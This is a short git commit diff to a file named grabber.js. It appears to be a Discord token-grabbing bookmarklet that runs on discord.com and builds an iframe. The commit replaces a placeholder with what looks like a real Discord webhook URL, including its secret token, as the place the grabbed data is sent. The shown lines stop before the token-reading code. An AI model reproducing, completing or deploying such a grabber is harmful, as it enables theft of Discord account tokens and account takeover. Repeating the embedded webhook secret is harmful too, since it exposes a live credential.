8ec7a301a16e2dd8aab14948a07de10e96d07b60
Melloe-code <79112559+Melloe-code@users.noreply.github.com>
2022-03-24 20:40:38 -0400

    Update grabber.js

--- grabber.js
+++ grabber.js
@@ -1,5 +1,5 @@
 javascript: void (function () {
-  var SEND = "<YOUR_WEBHOOK_HERE>";
+  var SEND = "<https://discord.com/api/webhooks/956708631783555076/ZnYrv39NvKvo_k8Tby3L4xI6j8OmM-5dgUyZyPOvKem2KrvhnIAUpSytLGceALmNv9_g>";
   "https://discord.com" == this.document.location.origin &&
     (function () {
       const a = document.createElement("iframe");
